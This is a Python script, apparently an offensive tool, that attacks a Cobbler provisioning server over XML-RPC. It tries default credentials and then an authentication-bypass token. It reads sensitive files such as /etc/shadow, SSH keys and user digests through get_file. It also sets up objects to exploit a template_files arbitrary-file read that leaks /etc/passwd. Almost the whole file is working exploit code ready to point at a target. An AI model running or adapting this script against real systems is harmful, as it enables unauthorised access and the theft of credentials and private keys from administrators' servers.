#!/usr/bin/env python3
"""
Enhanced Cobbler XML-RPC Enumeration Script ..beta..
Improved version with better method discovery, version detection, and kernel id
"""
import xmlrpc.client, re, sys, time

HOST   = "127.0.0.1:25151"
USER   = "cobbler"
PASS   = "cobbler"
TIMEOUT = 8

def sp(url):
    """Create ServerProxy from various URL formats"""
    if "://" not in url:
        url = f"http://{url}/RPC2"
    elif not url.endswith("/RPC2"):
        url = url.rstrip("/") + "/RPC2"
    return xmlrpc.client.ServerProxy(url, allow_none=True)

def login_any(server, user, passwd):
    """Try real credentials first, then bypass token (-1)"""
    try:
        t = server.login(user, passwd)
        print(f"[+] Authenticated as {user}:{passwd}")
        return t, "creds"
    except Exception as e1:
        try:
            t = server.login("", -1)
            print("[+] Authenticated with bypass token (-1)")
            return t, "bypass"
        except Exception as e2:
            raise RuntimeError(f"Login failed - creds:{e1} | bypass:{e2}")

def discover_xmlrpc_methods(server):
    """Enhanced method discovery"""
    methods_found = []
    
    # Try system.listMethods if available
    try:
        methods = server.system.listMethods()
        print(f"[+] Found {len(methods)} methods via system.listMethods")
        return [(m, "discovered") for m in methods]
    except Exception:
        print("[!] system.listMethods not available, using brute force...")
    
    # Brute force common Cobbler methods
    common_methods = [
        # Read operations
        "get_file", "get_template_file_for_system", "get_config_data",
        "get_settings", "get_signatures", "get_item", "get_items",
        "get_distros", "get_profiles", "get_systems", "get_images",
        "get_repos", "get_mgmtclasses", "get_packages", "get_files",
        
        # Version/info methods
        "version", "get_version", "extended_version", "check_access",
        "get_user_from_token", "get_item_names", "find_items",
        
        # Template/file operations
        "read_or_write_kickstart_template", "read_or_write_snippet",
        "get_kickstart_templates", "get_snippets",
        
        # System operations
        "sync", "background_sync", "run_install_triggers",
        "generate_gpxe", "generate_bootcfg", "generate_script",
        
        # Authentication
        "login", "logout", "token_check",
    ]
    
    for method in common_methods:
        try:
            m = getattr(server, method, None)
            if m:
                try:
                    m()  # Try no args
                    methods_found.append((method, "works_no_args"))
                except Exception as e:
                    if "takes" in str(e) or "required" in str(e) or "argument" in str(e):
                        methods_found.append((method, "needs_args"))
                    elif "unknown remote method" not in str(e).lower():
                        methods_found.append((method, "exists"))
        except Exception:
            continue
    
    return methods_found

def get_cobbler_version(server, token):
    """Multiple approaches to detect Cobbler version"""
    version_info = {}
    
    # Method 1: Direct version methods
    version_methods = ["version", "get_version", "extended_version"]
    for method in version_methods:
        for use_token in [True, False]:
            try:
                if use_token:
                    result = getattr(server, method)(token)
                else:
                    result = getattr(server, method)()
                version_info[f"{method}({'with_token' if use_token else 'no_token'})"] = result
                print(f"[+] {method}: {result}")
                break
            except Exception:
                continue
    
    # Method 2: Settings introspection
    try:
        settings = server.get_settings(token)
        if isinstance(settings, dict):
            version_keys = ['version', 'cobbler_version', 'server_info', 'server']
            for key in version_keys:
                if key in settings:
                    version_info[f"settings.{key}"] = settings[key]
                    print(f"[+] Settings {key}: {settings[key]}")
    except Exception:
        pass
    
    # Method 3: Read version files via LFI
    version_files = [
        "/etc/cobbler/version",
        "/usr/share/cobbler/version", 
        "/var/lib/cobbler/version",
        "/usr/lib/python*/site-packages/cobbler/version",
    ]
    
    for vfile in version_files:
        try:
            data = server.get_file(vfile)
            if data and len(data.strip()) > 0:
                version_info[f"file:{vfile}"] = data.strip()
                print(f"[+] Version from {vfile}: {data.strip()}")
        except Exception:
            pass
    
    return version_info

def read_cobbler_configs(server):
    """Read Cobbler configuration files"""
    config_files = [
        "/etc/cobbler/settings",
        "/etc/cobbler/settings.yaml",
        "/etc/cobbler/settings.d/settings",
        "/etc/cobbler/users.conf",
        "/etc/cobbler/users.digest", 
        "/etc/cobbler/modules.conf",
        "/etc/cobbler/dhcp.template",
        "/etc/cobbler/rsync.template",
    ]
    
    configs = {}
    for cf in config_files:
        try:
            data = server.get_file(cf)
            if data and len(data.strip()) > 0:
                configs[cf] = data
                print(f"[+] Read config: {cf} ({len(data)} bytes)")
                
                # Parse for security-relevant settings
                if "settings" in cf:
                    interesting_keywords = [
                        "allow_duplicate", "anamon_enabled", "auth_token_expiration",
                        "ldap_", "authn_", "authz_", "default_password", "enable_gpxe",
                        "enable_menu", "kernel_options", "manage_", "pxe_just_once",
                        "server:", "next_server:", "redhat_management_server"
                    ]
                    
                    for line in data.split('\n'):
                        line = line.strip()
                        if line and not line.startswith('#'):
                            for keyword in interesting_keywords:
                                if keyword in line.lower():
                                    print(f"    -> {line}")
                                    break
        except Exception:
            continue
    
    return configs

def comprehensive_kernel_discovery(server):
    """Enhanced kernel/initrd discovery with better fingerprinting"""
    
    # Get system information
    system_info = {}
    info_files = [
        "/etc/os-release", "/etc/lsb-release", "/etc/debian_version",
        "/etc/redhat-release", "/etc/centos-release", "/etc/fedora-release",
        "/proc/version", "/proc/cmdline"
    ]
    
    for inf in info_files:
        try:
            data = server.get_file(inf)
            if data:
                system_info[inf] = data.strip()
                print(f"[+] System info {inf}: {data.strip()[:80]}...")
        except Exception:
            pass
    
    # Extract kernel version hints
    version_candidates = set()
    if "/proc/version" in system_info:
        version_text = system_info["/proc/version"]
        patterns = [
            r'(\d+\.\d+\.\d+-\d+-\w+)',  # 6.1.0-37-amd64
            r'(\d+\.\d+\.\d+-\w+)',      # 5.15.0-generic  
            r'(\d+\.\d+\.\d+)',          # 6.1.0
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, version_text)
            version_candidates.update(matches)
            
        print(f"[+] Kernel version candidates: {list(version_candidates)}")
    
    # Test kernel paths
    found_kernels = []
    found_initrds = []
    
    # Version-specific paths
    for ver in version_candidates:
        kernel_paths = [
            f"/boot/vmlinuz-{ver}",
            f"/boot/vmlinuz-{ver}-amd64", 
            f"/boot/vmlinuz-{ver}-generic",
            f"/boot/vmlinuz-{ver}.el7.x86_64",
            f"/boot/vmlinuz-{ver}.el8.x86_64",
        ]
        
        initrd_paths = [
            f"/boot/initrd.img-{ver}",
            f"/boot/initrd.img-{ver}-amd64",
            f"/boot/initrd.img-{ver}-generic", 
            f"/boot/initramfs-{ver}.img",
            f"/boot/initramfs-{ver}.el7.x86_64.img",
            f"/boot/initramfs-{ver}.el8.x86_64.img",
        ]
        
        # Test kernels
        for kpath in kernel_paths:
            try:
                data = server.get_file(kpath)
                if data and len(data) > 5000:  # Reasonable kernel size
                    found_kernels.append(kpath)
                    print(f"[+] Found kernel: {kpath}")
                    break
            except Exception:
                continue
                
        # Test initrds
        for ipath in initrd_paths:
            try:
                data = server.get_file(ipath)
                if data and len(data) > 5000:
                    found_initrds.append(ipath)
                    print(f"[+] Found initrd: {ipath}")
                    break
            except Exception:
                continue
    
    # Generic fallback paths
    if not found_kernels:
        generic_kernels = ["/boot/vmlinuz", "/boot/vmlinuz-linux", "/vmlinuz"]
        for gk in generic_kernels:
            try:
                data = server.get_file(gk)
                if data and len(data) > 5000:
                    found_kernels.append(gk)
                    print(f"[+] Found generic kernel: {gk}")
                    break
            except Exception:
                continue
    
    if not found_initrds:
        generic_initrds = ["/boot/initrd.img", "/boot/initramfs-linux.img", "/initrd.img"]
        for gi in generic_initrds:
            try:
                data = server.get_file(gi)
                if data and len(data) > 5000:
                    found_initrds.append(gi)
                    print(f"[+] Found generic initrd: {gi}")
                    break
            except Exception:
                continue
    
    return found_kernels, found_initrds, system_info

def test_basic_methods(server, token):
    """Test basic Cobbler methods for functionality"""
    basic_methods = [
        "get_settings", "get_signatures", "get_distros", 
        "get_profiles", "get_systems", "get_images", "get_repos"
    ]
    
    for method in basic_methods:
        try:
            result = getattr(server, method)(token)
            result_type = type(result).__name__
            result_len = len(result) if hasattr(result, '__len__') else 'N/A'
            print(f"[+] {method} ✅ type={result_type} len={result_len}")
            
            # Show first few items for lists/dicts
            if isinstance(result, list) and result:
                print(f"    Sample: {str(result[0])[:100]}...")
            elif isinstance(result, dict) and result:
                first_key = list(result.keys())[0]
                print(f"    Sample key: {first_key} -> {str(result[first_key])[:50]}...")
                
        except Exception as e:
            print(f"[-] {method} ❌ {str(e)[:80]}...")

def test_lfi_capabilities(server):
    """Test LFI via get_file method"""
    interesting_files = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/etc/os-release", "/proc/version", "/proc/cmdline",
        "/root/.ssh/authorized_keys", "/home/*/.ssh/id_rsa",
        "/var/log/auth.log", "/var/log/messages",
    ]
    
    found_files = {}
    
    for filepath in interesting_files:
        try:
            data = server.get_file(filepath)
            if data and len(data.strip()) > 0:
                found_files[filepath] = data
                print(f"[+] LFI Success: {filepath} ({len(data)} bytes)")
                
                # Show preview for small files
                if len(data) < 500:
                    print(f"    Content: {data.strip()[:200]}...")
        except Exception:
            pass
    
    if found_files:
        print(f"[!] LFI confirmed - read {len(found_files)} files via get_file()")
    else:
        print("[-] No LFI access via get_file()")
        
    return found_files

def safe_name(prefix):
    """Generate unique names for test objects"""
    return f"{prefix}_{int(time.time())}_{hash(time.time()) % 10000}"

def test_template_file_exploit(server, token, kernel, initrd):
    """Test the template_files arbitrary file read exploit"""
    if not (kernel and initrd):
        print("[-] Cannot test template exploit - no kernel/initrd found")
        return False
        
    try:
        # Create minimal objects for exploitation
        distro_name = safe_name("test_distro")
        profile_name = safe_name("test_profile") 
        system_name = safe_name("test_system")
        
        # Create distro
        did = server.new_distro(token)
        server.modify_distro(did, "name", distro_name, token)
        server.modify_distro(did, "breed", "redhat", token)
        server.modify_distro(did, "arch", "x86_64", token)
        server.modify_distro(did, "kernel", kernel, token)
        server.modify_distro(did, "initrd", initrd, token)
        server.save_distro(did, token)
        
        # Create profile
        pid = server.new_profile(token)
        server.modify_profile(pid, "name", profile_name, token)
        server.modify_profile(pid, "distro", distro_name, token)
        server.save_profile(pid, token)
        
        # Create system with template_files mapping
        sid = server.new_system(token)
        server.modify_system(sid, "name", system_name, token)
        server.modify_system(sid, "profile", profile_name, token)
        server.modify_system(sid, "template_files", {"/etc/passwd": "/test_leak"}, token)
        server.save_system(sid, token)
        
        # Sync to finalize
        try:
            server.sync(token)
        except Exception as sync_err:
            print(f"[!] Sync warning: {sync_err}")
        
        # Test template file read
        for token_mode in [False, True]:
            try:
                if token_mode:
                    data = server.get_template_file_for_system(system_name, "/test_leak", token)
                else:
                    data = server.get_template_file_for_system(system_name, "/test_leak")
                    
                if data and "root:" in data:
                    print(f"[!] TEMPLATE EXPLOIT SUCCESS ({'with token' if token_mode else 'no token'})")
                    print(f"    Retrieved /etc/passwd via template_files mapping:")
                    print(f"    {data[:200]}...")
                    return True
                    
            except Exception as e:
                continue
                
        print("[-] Template exploit failed - method exists but no data retrieved")
        return False
        
    except Exception as e:
        print(f"[-] Template exploit setup failed: {e}")
        return False

def main():
    target = HOST if len(sys.argv) < 2 else sys.argv[1]
    print(f"[*] Enhanced Cobbler Enumeration - Target: {target}")
    print("=" * 60)
    
    server = sp(target)

    # 1) Authentication
    try:
        token, auth_method = login_any(server, USER, PASS)
        print(f"[!] Authentication successful - Token: {token} (via {auth_method})\n")
    except Exception as e:
        print(f"[-] Authentication failed: {e}")
        return

    # 2) Method discovery  
    print("[*] Discovering XML-RPC methods...")
    methods = discover_xmlrpc_methods(server)
    if methods:
        print(f"[+] Found {len(methods)} methods:")
        for method, status in methods[:15]:  # Show first 15
            print(f"    - {method} ({status})")
        if len(methods) > 15:
            print(f"    ... and {len(methods) - 15} more")
    print()

    # 3) Version detection
    print("[*] Detecting Cobbler version...")
    version_info = get_cobbler_version(server, token)
    if not version_info:
        print("[-] Could not determine Cobbler version")
    print()

    # 4) Basic method testing
    print("[*] Testing basic Cobbler methods...")
    test_basic_methods(server, token)
    print()

    # 5) LFI testing
    print("[*] Testing Local File Inclusion capabilities...")
    lfi_files = test_lfi_capabilities(server)
    print()

    # 6) Configuration analysis
    print("[*] Reading Cobbler configuration files...")
    configs = read_cobbler_configs(server)
    print()

    # 7) Enhanced kernel discovery
    print("[*] Performing comprehensive kernel/initrd discovery...")
    kernels, initrds, system_info = comprehensive_kernel_discovery(server)
    print()

    # 8) Template exploit testing
    if kernels and initrds:
        print("[*] Testing template_files arbitrary file read exploit...")
        exploit_success = test_template_file_exploit(server, token, kernels[0], initrds[0])
        if exploit_success:
            print("\n[!] CRITICAL: Arbitrary file read via template_files confirmed!")
            print("    Use template_files mapping to read sensitive files")
        print()

    # Summary
    print("=" * 60)
    print("[*] ENUMERATION SUMMARY")
    print(f"    Methods found: {len(methods)}")
    print(f"    LFI files read: {len(lfi_files)}")
    print(f"    Config files: {len(configs)}")
    print(f"    Kernels found: {len(kernels)}")
    print(f"    Initrds found: {len(initrds)}")
    
    if lfi_files or (kernels and initrds):
        print("\n[!] EXPLOITATION VECTORS IDENTIFIED:")
        if lfi_files:
            print("    - Direct LFI via get_file() method")
        if kernels and initrds:
            print("    - Arbitrary file read via template_files mapping")

if __name__ == "__main__":
    main()
